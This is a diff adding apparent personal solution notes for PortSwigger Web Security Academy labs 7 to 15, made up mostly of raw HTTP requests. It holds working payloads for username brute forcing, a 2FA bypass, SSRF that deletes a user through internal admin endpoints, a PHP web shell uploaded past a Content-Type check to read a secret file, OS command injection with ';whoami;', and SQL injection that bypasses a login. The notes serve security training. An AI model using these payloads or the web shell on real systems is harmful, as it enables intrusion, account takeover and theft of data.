@@ -100,3 +100,330 @@ Priority: u=0, i
 
 <input required type=password name=password value='wniux3m00tda2vxcss1h'/>
 
+7) Lab: Username enumeration via different responses
+
+https://0ae70074036155968023d554002600cf.web-security-academy.net/
+
+---
+
+POST /login HTTP/2
+Host: 0ae70074036155968023d554002600cf.web-security-academy.net
+Cookie: session=9ab0fp5V4UdxXLKid449lLoAyB63M93H
+Content-Length: 42
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Origin: https://0ae70074036155968023d554002600cf.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ae70074036155968023d554002600cf.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=login_test&password=password_test
+
+---
+
+Sniper attack -> login list -> password list
+
+->
+
+ad:harley
+
+8) Lab: 2FA simple bypass 
+
+https://0a7200ce036f2a48816a3e5200880033.web-security-academy.net/
+
+---
+
+Login as - carlos:montoya
+
+->
+
+Skip 2FA, force go to https://0a7200ce036f2a48816a3e5200880033.web-security-academy.net/
+
+9) Lab: Basic SSRF against the local server
+
+https://0a57005b048559ff81e3e3f2004900ad.web-security-academy.net/
+
+---
+
+POST /product/stock HTTP/2
+Host: 0a57005b048559ff81e3e3f2004900ad.web-security-academy.net
+Cookie: session=LENWJRtykSVshn8NbquW4ebOdRoDPIFP
+Content-Length: 31
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0a57005b048559ff81e3e3f2004900ad.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a57005b048559ff81e3e3f2004900ad.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+stockApi=http://localhost/admin
+
+->
+
+https://0a57005b048559ff81e3e3f2004900ad.web-security-academy.net/product/stock
+
+->
+
+POST /product/stock HTTP/2
+Host: 0a57005b048559ff81e3e3f2004900ad.web-security-academy.net
+Cookie: session=LENWJRtykSVshn8NbquW4ebOdRoDPIFP
+Content-Length: 54
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0a57005b048559ff81e3e3f2004900ad.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a57005b048559ff81e3e3f2004900ad.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+stockApi=http://localhost/admin/delete?username=carlos
+
+10) Lab: Basic SSRF against another back-end system
+
+https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net/
+
+->
+
+https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net/product?productId=1
+
+->
+
+POST /product/stock HTTP/2
+Host: 0afd002a03ea3ea881995e9700af002e.web-security-academy.net
+Cookie: session=Mm3Kem97YIkGjeqegTbH4olNXCjQStwa
+Content-Length: 96
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+
+---
+
+POST /product/stock HTTP/2
+Host: 0afd002a03ea3ea881995e9700af002e.web-security-academy.net
+Cookie: session=Mm3Kem97YIkGjeqegTbH4olNXCjQStwa
+Content-Length: 40
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+stockApi=http://192.168.0.249:8080/admin
+
+->
+
+POST /product/stock HTTP/2
+Host: 0afd002a03ea3ea881995e9700af002e.web-security-academy.net
+Cookie: session=Mm3Kem97YIkGjeqegTbH4olNXCjQStwa
+Content-Length: 63
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0afd002a03ea3ea881995e9700af002e.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+stockApi=http://192.168.0.249:8080/admin/delete?username=carlos
+
+11) Lab: Remote code execution via web shell upload
+
+https://0a350068044e890c81c434d0005d00ee.web-security-academy.net/
+
+--
+
+<?php echo system($_GET['command']); ?>
+
+---
+
+https://0a350068044e890c81c434d0005d00ee.web-security-academy.net/files/avatars/exploit.php?command=id
+
+---
+
+https://0a350068044e890c81c434d0005d00ee.web-security-academy.net/files/avatars/exploit.php?command=cat%20/home/carlos/secret
+
+->
+
+DToYuVYgxUQbY2m2jEA8q0PLlm2H78R1
+
+12) Lab: Web shell upload via Content-Type restriction bypass
+
+https://0a9500a604015f6380a14e5f00b400df.web-security-academy.net/
+
+---
+
+POST /my-account/avatar HTTP/2
+Host: 0a9500a604015f6380a14e5f00b400df.web-security-academy.net
+Cookie: session=uxAGyCXKMURPKR7m6WHQ210AxRrEDu82
+Content-Length: 445
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzdrOBoJpHIsgPv0m
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Origin: https://0a9500a604015f6380a14e5f00b400df.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a9500a604015f6380a14e5f00b400df.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+------WebKitFormBoundaryzdrOBoJpHIsgPv0m
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php echo system($_GET['command']); ?>
+------WebKitFormBoundaryzdrOBoJpHIsgPv0m
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryzdrOBoJpHIsgPv0m
+Content-Disposition: form-data; name="csrf"
+
+fLTLAdxteeWqale6igK1aqSrIcF9sjO5
+------WebKitFormBoundaryzdrOBoJpHIsgPv0m--
+
+->
+
+https://0a9500a604015f6380a14e5f00b400df.web-security-academy.net/files/avatars/exploit.php?command=cat%20/home/carlos/secret
+
+->
+
+3tqzm1CIDN0zkHbUywy45PjZdOBlb6jw
+
+13) Lab: OS command injection, simple case
+
+Цель команды				Linux			Windows
+Имя текущего пользователя	whoami			whoami
+Операционная система		uname -a		ver
+Сетевая конфигурация		ifconfig		ipconfig /all
+Сетевые подключения			netstat -an		netstat -an
+Запущенные процессы			ps -ef			tasklist
+
+---
+
+POST /product/stock HTTP/2
+Host: 0af9007f0389636a8136d99c00460009.web-security-academy.net
+Cookie: session=IX4Fv7qO5GC7fEUln6TjWkfCybN5JHZg
+Content-Length: 28
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0af9007f0389636a8136d99c00460009.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0af9007f0389636a8136d99c00460009.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+productId=1&storeId=;whoami;
+
+14) Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+GET /filter?category=Pets'%20or%201=1%20--%20 HTTP/2
+Host: 0aad00e1049ea90580379e7e00dd003a.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+15) Lab: SQL injection vulnerability allowing login bypass
+
+POST /login HTTP/2
+Host: 0a2f00b904a622c5807744c5005f009c.web-security-academy.net
+Cookie: session=BDvkwkaEfH35eZrmuJcoB8uotlSeCUfi
+Content-Length: 80
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Origin: https://0a2f00b904a622c5807744c5005f009c.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a2f00b904a622c5807744c5005f009c.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=xSzr57iPrIgE71nG96JANRkyS471cvoA&username=administrator%27+--+&password=222
